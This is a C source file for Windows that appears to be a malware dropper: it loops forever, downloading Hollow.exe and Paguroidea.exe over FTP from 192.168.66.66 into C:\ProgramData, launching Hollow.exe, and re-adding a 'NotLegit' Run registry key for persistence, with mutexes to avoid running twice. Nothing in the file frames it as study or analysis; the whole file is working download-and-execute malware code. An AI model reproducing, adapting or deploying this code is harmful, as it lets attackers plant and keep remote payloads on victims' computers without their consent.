#include <windows.h> 
#include <WinInet.h>
#pragma comment(lib, "WinInet.lib")
#include<Shlobj.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

int Download(const char* from, const char* file) {
	DeleteUrlCacheEntry(from);
	HRESULT ret = URLDownloadToFile(0, from, file, 0, 0);
	if (FAILED(ret))
		return 1;
	return 0;
}
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {
	//MessageBox(NULL, "Hello, World!", "Hi!", MB_OK); //For Debug
	HANDLE mutex2 = NULL;
	HANDLE mutex = CreateMutexA(0, FALSE, "Paguroidea");
	if (GetLastError() == ERROR_ALREADY_EXISTS && mutex != NULL) {
		CloseHandle(mutex);
		mutex2 = CreateMutexA(0, FALSE, "Paguroidea2");
		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			return 1;
		}
	}
	while (TRUE) {
		Download("ftp://192.168.66.66/Hollow.exe", "C:\\ProgramData\\Hollow.exe");
		Download("ftp://192.168.66.66/Paguroidea.exe", "C:\\ProgramData\\Paguroidea.exe");
		HANDLE hollowmutex = NULL;
		hollowmutex = CreateMutexA(0, FALSE, "Hollow");
		if (GetLastError() != ERROR_ALREADY_EXISTS && hollowmutex != NULL) {
			CloseHandle(hollowmutex);
			STARTUPINFO startupInfo;
			PROCESS_INFORMATION processInformation;
			ZeroMemory(&startupInfo, sizeof(startupInfo));
			startupInfo.cb = sizeof(startupInfo);
			ZeroMemory(&processInformation, sizeof(processInformation));
			int ret = 0;
			ret = CreateProcess(
				"C:\\ProgramData\\Hollow.exe",
				NULL,
				NULL,
				NULL,
				FALSE,
				NULL,
				NULL,
				"C:\\ProgramData\\",
				&startupInfo,
				&processInformation);
			CloseHandle(processInformation.hProcess);
			CloseHandle(processInformation.hThread);
		}
		else
			if (hollowmutex != NULL)
				CloseHandle(hollowmutex);
		HKEY key;
		char buff[512];
		DWORD size = sizeof(buff);
		DWORD type;
		NTSTATUS status = ERROR_SUCCESS;
		status = RegGetValueA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "NotLegit", 
			RRF_RT_REG_SZ, &type, buff, &size);
		if (status != ERROR_SUCCESS || strcmp(buff, "C:\\ProgramData\\Hollow.exe")) {
			status = RegSetKeyValueA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "NotLegit", REG_SZ, 
				"C:\\ProgramData\\Hollow.exe", sizeof("C:\\ProgramData\\Hollow.exe"));
		}
		Sleep(10000);
	}

	//PWSTR appdatapath = (PWSTR)malloc(MAX_PATH);
	//HRESULT ret = SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdatapath);


}